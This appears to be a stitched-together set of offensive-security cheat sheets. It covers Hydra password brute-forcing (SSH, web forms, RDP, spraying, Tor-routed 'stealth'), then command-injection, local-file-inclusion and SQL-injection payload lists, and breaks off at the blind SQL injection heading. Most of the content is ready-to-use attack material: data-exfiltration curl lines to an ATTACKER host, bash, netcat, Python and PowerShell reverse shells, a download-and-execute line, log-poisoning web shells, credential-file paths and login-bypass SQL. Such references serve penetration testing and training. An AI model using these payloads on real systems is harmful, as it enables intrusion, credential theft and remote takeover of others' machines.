<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="Brute Force">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="Protocols">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="Network">
</p>

<p align="center">
  <b>🔑 The most famous parallelized network login cracker</b>
</p>

---

## 🔐 Hydra — 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Basic Syntax](#-basic-syntax)
- [Supported Protocols](#-supported-protocols)
- [SSH Attacks](#-ssh-attacks)
- [FTP Attacks](#-ftp-attacks)
- [HTTP Form Attacks](#-http-form-attacks)
- [Database Attacks](#-database-attacks)
- [Remote Desktop Attacks](#-remote-desktop-attacks)
- [Other Services](#-other-services)
- [Wordlists & Passwords](#-wordlists--passwords)
- [Advanced Options](#-advanced-options)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference](#-quick-reference)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 🔐 Hydra — 📥 Installation

### Kali Linux (Pre-installed)
```bash
hydra -h
```

### Ubuntu/Debian
```bash
sudo apt install hydra
```

### From Source
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

### macOS (Homebrew)
```bash
brew install hydra
```

### Verify Installation
```bash
hydra -h
hydra -V
```

---

## 🔐 Hydra — ⌨️ Basic Syntax

### General Syntax
```bash
hydra [options] target service
```

### Common Options

| Option | Description |
|--------|-------------|
| `-l` | Single username |
| `-L` | Username list |
| `-p` | Single password |
| `-P` | Password list |
| `-C` | Colon-separated file (user:pass) |
| `-t` | Threads (default: 16) |
| `-s` | Port number |
| `-o` | Output file |
| `-f` | Stop on first valid pair |
| `-V` | Verbose mode |
| `-vV` | Very verbose |
| `-d` | Debug mode |

### Quick Start
```bash
# Single user, password list
hydra -l admin -P passwords.txt target ssh

# User list, single password
hydra -L users.txt -p password123 target ssh

# Both lists
hydra -L users.txt -P passwords.txt target ssh
```

---

## 🔐 Hydra — 📡 Supported Protocols

### Complete Protocol List

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

## 🔐 Hydra — 🔐 SSH Attacks

### Basic SSH Attack
```bash
# Single user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Multiple users
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Specific port
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

### SSH with Options
```bash
# Limit attempts (avoid lockout)
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# Stop on first success
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# Verbose output
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

### SSH Key Authentication
```bash
# Using private key (check weak keys)
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

## 🔐 Hydra — 📂 FTP Attacks

### Basic FTP Attack
```bash
# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Anonymous FTP check
hydra -l anonymous -p anonymous ftp://192.168.1.1

# Multiple users
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### FTPS (FTP over SSL)
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

## 🔐 Hydra — 🌐 HTTP Form Attacks

### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# Format:
# "/path:params:failure_string"
```

### HTTP-POST-FORM (Most Common)

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### Form Attack Syntax

```
"/page:POST_params:Failure_string"

Where:
- ^USER^ = Username placeholder
- ^PASS^ = Password placeholder
- Failure_string = Text shown on failed login
```

### Success-Based Detection

```bash
# Use S= for success string instead of failure
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

### With Cookies

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

### HTTP Basic Auth

```bash
# HTTP Basic Authentication
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

### HTTP Proxy

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

## 🔐 Hydra — 🗄️ Database Attacks

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# Specific port
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

### Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

### Oracle

```bash
# Oracle SID attack
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# Oracle listener
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

## 🔐 Hydra — 🖥️ Remote Desktop Attacks

### RDP (Windows Remote Desktop)

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# Limit threads (RDP is slow)
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

### VNC

```bash
# VNC (password only)
hydra -P passwords.txt vnc://192.168.1.1

# VNC specific version
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

## 🔐 Hydra — 🔧 Other Services

### SMB (Windows Shares)

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

### SMTP

```bash
# SMTP authentication
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# SMTP Enumeration
hydra -L users.txt smtp-enum://192.168.1.1
```

### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

## 🔐 Hydra — 📚 Wordlists & Passwords

### Popular Wordlists

```bash
# Kali Linux locations
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# SecLists passwords
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

### Password Generation (-x)

```bash
# Generate passwords: min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # 4-6 lowercase letters
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # 4-6 uppercase letters
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # 4-6 numbers
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # Mixed

# Charset options:
# a = lowercase    A = uppercase
# 1 = numbers      ! = special chars
```

### Colon-Separated File (-C)

```bash
# user:password format
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

### Username/Password Customization

```bash
# Null passwords
hydra -l admin -e n 192.168.1.1 ssh

# Try username as password
hydra -l admin -e s 192.168.1.1 ssh

# Try reversed username as password
hydra -l admin -e r 192.168.1.1 ssh

# All special checks
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

## 🔐 Hydra — ⚡ Advanced Options

### Output & Logging

```bash
# Save results to file
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# JSON output
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

### Resume Attacks

```bash
# Save session for resuming
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# Resume interrupted attack
hydra -R
```

### Proxy Support

```bash
# HTTP proxy
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# SOCKS proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

### Performance Tuning

```bash
# Threads (default: 16)
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# Wait time between attempts
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# Connection timeout
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

### Multiple Targets

```bash
# From file
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

## 🔐 Hydra — 🎬 Real-World Examples

### Example 1: SSH Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

### Example 2: Web Login Form
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

### Example 3: WordPress Login
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

### Example 4: Multiple Services
```bash
# Scan multiple services on one host
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

### Example 5: Password Spray
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

### Example 6: With Proxy/Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

### Example 7: HTTP Basic Auth (Admin Panel)
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

### Example 8: RDP Attack (Careful!)
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

## 🔐 Hydra — 📊 Quick Reference

### Essential Commands

| Task | Command |
|------|---------|
| SSH attack | `hydra -l user -P pass.txt ssh://target` |
| FTP attack | `hydra -l user -P pass.txt ftp://target` |
| HTTP POST form | `hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"` |
| RDP attack | `hydra -l user -P pass.txt rdp://target` |
| Save output | `hydra ... -o results.txt` |
| Resume attack | `hydra -R` |

### Common Options

| Option | Description |
|--------|-------------|
| `-l/-L` | Username/list |
| `-p/-P` | Password/list |
| `-C` | user:pass file |
| `-t` | Threads |
| `-s` | Port |
| `-f` | Stop on success |
| `-V` | Verbose |
| `-o` | Output file |
| `-x` | Generate passwords |
| `-e nsr` | Try null/same/reverse |

---

## 🔐 Hydra — 💡 Tips & Best Practices

### Performance Tips

1. **Limit Threads for Sensitive Services**
   ```bash
   # RDP, SMB - use low threads
   hydra -t 1 ...
   
   # SSH - moderate
   hydra -t 4 ...
   
   # Web forms - can be higher
   hydra -t 16 ...
   ```

2. **Use Targeted Wordlists**
   ```bash
   # Better than rockyou.txt:
   # - Top 1000 passwords
   # - Default credentials
   # - Company-specific
   ```

3. **Check for Lockout Policies First**
   ```bash
   # Test with small wordlist first
   hydra -l admin -P small.txt -t 1 target ssh
   ```

### Stealth Tips

```bash
# Add delays
hydra -l admin -P passwords.txt -w 30 target ssh

# Low threads
hydra -l admin -P passwords.txt -t 2 target ssh

# Through proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

## 🔐 Hydra — 📚 Resources

### Official Resources
- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra Manual](https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Default Credentials](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### Related Cheatsheets
- [Nmap](../Nmap/README.md)
- [Metasploit](../Metasploit/README.md)
- [SQLMap](../SQLMap/README.md)

---

<p align="center">
  <b>🔓 Master Network Login Cracking!</b><br>
  <i>Always get authorization first</i>
</p>

## 📦 Payloads — # 💻 Command Injection Payloads

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## 📦 Payloads — 🎯 Command Separators

### Linux/Unix
```bash
;       # Semicolon - execute after
|       # Pipe - send output to next command
||      # OR - execute if first fails
&       # Background - execute in background
&&      # AND - execute if first succeeds
`cmd`   # Backticks - command substitution
$(cmd)  # Dollar - command substitution
\n      # Newline - separate commands
```

### Windows
```cmd
;       # Sometimes works
|       # Pipe
||      # OR
&       # Execute both
&&      # AND
\n      # Newline
%0a     # URL encoded newline
```

---

## 📦 Payloads — 💉 Basic Payloads

### Simple Test
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### URL Encoded
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # newline + id
```

---

## 📦 Payloads — 🔥 Blind Command Injection

### Time-Based Detection
```bash
# Sleep commands
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### DNS-Based Detection
```bash
# Using nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Using curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### HTTP-Based Exfiltration
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

## 📦 Payloads — 🛡️ Filter Bypass Techniques

### Space Bypass
```bash
# Using $IFS (Internal Field Separator)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Using tabs
;cat	/etc/passwd

# Using braces
{cat,/etc/passwd}
```

### Keyword Bypass
```bash
# Splitting commands
w'h'oami
w"h"oami
who$@ami
who\ami

# Using wildcards
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Using variables
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Hex encoding
echo -e "\x69\x64" | sh    # id
```

### Special Character Bypass
```bash
# Using different delimiters
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Newline injection
%0aid
%0Acat%20/etc/passwd

# Using comments
; id #
| id #
```

---

## 📦 Payloads — 🐧 Linux Payloads

### File Reading
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Command Execution
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Reverse Shell
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 📦 Payloads — 🪟 Windows Payloads

### Basic Commands
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### File Reading
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Reverse Shell
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📦 Payloads — 📝 Common Injection Points

```
URL parameters:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

POST parameters:
  filename=test.txt;id
  host=localhost|whoami

Headers:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

File upload names:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📦 Payloads — 📋 Testing Checklist

```markdown
□ Test all command separators (; | || & && ` $())
□ Test URL encoded versions
□ Test time-based blind injection
□ Test DNS/HTTP exfiltration
□ Test space bypass ($IFS, tabs, braces)
□ Test keyword bypass (quotes, wildcards)
□ Test newline injection (%0a)
□ Check for filtered characters
□ Try both Linux and Windows commands
```

---

## 📦 Payloads — 🔗 Related Payloads

- [LFI Payloads](./LFI.md)
- [SSTI Payloads](./SSTI.md)

---

**Back to Payloads:** [💉 Payloads Collection](./README.md)

## 📦 Payloads — # 📂 LFI Payloads Collection

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📦 Payloads — 🐧 Linux Files

### Basic Traversal
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### URL Encoded
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Bypass Techniques
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Interesting Linux Files
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 📦 Payloads — 🪟 Windows Files

### Basic Traversal
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Interesting Windows Files
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 📦 Payloads — 🔄 Wrappers (PHP)

### php://filter (Read Source)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (RCE)
```
php://input
POST: <?php system('id'); ?>
```

### data:// Wrapper
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (RCE)
```
expect://id
expect://whoami
```

### zip:// Wrapper
```
zip://path/to/file.zip%23shell.php
```

### phar:// Wrapper
```
phar://uploads/shell.jpg/test.php
```

---

## 📦 Payloads — 🔥 Log Poisoning (RCE)

### Apache Access Log
```bash
# 1. Inject PHP via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Include log file
?page=/var/log/apache2/access.log&cmd=id
```

### SSH Log
```bash
# 1. Inject via SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Include log
?page=/var/log/auth.log&cmd=id
```

### Mail Log
```bash
# 1. Send poisoned email
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Include log
?page=/var/log/mail.log&cmd=id
```

### Proc Environ
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

## 📦 Payloads — 📊 Quick Reference

### Detection
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Filter Bypass
| Filter | Bypass |
|--------|--------|
| `../` blocked | `....//`, `..././` |
| `.php` required | `%00`, null byte |
| Whitelist | php:// wrappers |

### Common Parameters
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📦 Payloads — 📚 Resources

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 LFI Payload Arsenal</b><br>
  <i>For educational purposes only!</i>
</p>

## 📦 Payloads — # 💉 SQL Injection Payloads

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📦 Payloads — 📋 Table of Contents

- [Detection Payloads](#-detection-payloads)
- [Authentication Bypass](#-authentication-bypass)
- [Union-Based Injection](#-union-based-injection)
- [Error-Based Injection](#-error-based-injection)
- [Blind SQL Injection](#-blind-sql-injection)
- [Time-Based Injection](#-time-based-injection)
- [DBMS Specific](#-dbms-specific)
- [WAF Bypass](#-waf-bypass)
- [Out-of-Band](#-out-of-band)

---

## 📦 Payloads — 🔍 Detection Payloads

### Basic Detection

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Boolean Detection

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Arithmetic Detection

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### String Concatenation

```sql
' || 'test
' + 'test
' 'test
```

---

## 📦 Payloads — 🔓 Authentication Bypass

### Login Bypass

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Username Field

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Password Field

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Common Bypass Combinations

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

## 📦 Payloads — 🔗 Union-Based Injection

### Finding Columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continue until error...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Basic Union

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Data Extraction

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### Union with Comments

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

## 📦 Payloads — ⚠️ Error-Based Injection

### MySQL Error-Based

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### MSSQL Error-Based

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### PostgreSQL Error-Based

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Oracle Error-Based

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## 📦 Payloads — 🔮 Blind SQL Injection

